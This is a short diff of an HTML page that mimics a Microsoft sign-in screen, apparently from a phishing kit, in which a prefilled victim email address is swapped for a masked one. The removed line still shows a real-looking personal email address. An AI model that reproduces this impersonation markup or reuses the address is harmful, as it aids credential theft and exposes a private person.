@@ -106,7 +106,7 @@ div .footerNode a, div .footerNode span {
               <span class="h5">Check email to continue</span><br>
               <span id="error" class="text-danger" style="display: none;">That Microsoft account does not exist. Enter a different account</span>
               <div class="form-group mt-2">
-                <input type="email" name="email" class="form-control rounded-0 border-dark" id="email" value="jlfp15@hotmail.com" aria-describedby="emailHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;">
+                <input type="email" name="email" class="form-control rounded-0 border-dark" id="email" value="XXXXXXhotmail.com" aria-describedby="emailHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;">
               </div>
               <p>No account? <a href="#">Create one!</a></p>
               
